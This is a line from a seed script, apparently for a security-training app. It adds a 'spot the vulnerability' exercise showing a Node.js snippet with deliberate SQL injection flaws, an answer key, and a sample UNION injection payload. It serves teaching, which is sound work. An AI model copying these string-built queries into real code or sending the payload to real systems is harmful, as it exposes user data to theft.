    db.session.add(LessonStep(lesson_id=l5_6.id, order_index=1, kind="spot", title="SPOT THE VULNERABILITY", prompt="This Node.js application has multiple SQL injection vulnerabilities. Find ALL vulnerable lines:\\n```javascript\\n// Line 1: const express = require('express');\\n// Line 2: const db = require('./database');\\n// Line 3:\\n// Line 4: app.get('/search', (req, res) => {\\n// Line 5:   const term = req.query.q;\\n// Line 6:   const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\\n// Line 7:   db.query(query, (err, results) => {\\n// Line 8:     res.json(results);\\n// Line 9:   });\\n// Line 10: });\\n// Line 11:\\n// Line 12: app.get('/user/:id', (req, res) => {\\n// Line 13:   const userId = req.params.id;\\n// Line 14:   const query = `SELECT * FROM users WHERE id = ${userId}`;\\n// Line 15:   db.query(query, (err, results) => {\\n// Line 16:     res.json(results);\\n// Line 17:   });\\n// Line 18: });\\n```", options=_j([]), correct_answer="Lines 6 and 14", explanation="*Both lines use template literals to embed user input directly into SQL strings. Even though Line 14 looks like it expects a number (user ID), there's nothing stopping an attacker from sending `1 UNION SELECT * FROM users--` as the URL parameter.*\\n---", hints=_j([])))
